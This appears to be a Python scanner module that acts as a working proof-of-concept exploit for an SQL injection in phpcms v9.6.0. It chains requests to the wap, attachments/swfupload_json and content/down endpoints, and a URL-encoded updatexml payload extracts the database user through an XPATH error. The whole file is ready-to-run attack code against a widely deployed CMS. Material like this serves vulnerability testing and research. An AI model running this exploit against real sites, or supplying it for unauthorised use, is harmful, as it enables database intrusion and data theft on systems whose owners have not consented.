#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpcms v9.6.0 SQL注入
referer: https://zhuanlan.zhihu.com/p/26263513
author: Lucifer
description: 过滤函数不严谨造成的过滤绕过。
'''
import sys
import requests



class phpcms_v96_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "Content-Type":"application/x-www-form-urlencoded", 
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        url_prefix = self.url + "/index.php?m=wap&c=index&a=init&siteid=1"
        tmp_cookie = {}
        try:
            req = requests.get(url_prefix, headers=headers, timeout=10, verify=False)
            for cookie in req.cookies:
                tmp_cookie = cookie.value
        except:
            pass
        post_data = {
            "userid_flash":tmp_cookie
        }
        url_suffix = self.url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26"
        try:
            req2 = requests.post(url_suffix, data=post_data, headers=headers, timeout=10, verify=False)
            for cookie in req2.cookies:
                tmp_cookie = cookie.value
        except:
            pass
        
        vulnurl = self.url + "/index.php?m=content&c=down&a_k="+str(tmp_cookie)
        try:
            req3 = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"XPATH syntax error" in req3.text:
                return "[+]存在phpcms v9.6.0 SQL注入漏洞...(高危)\tpayload: "+vulnurl
        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = phpcms_v96_sqli_BaseVerify(sys.argv[1])
    testVuln.run()
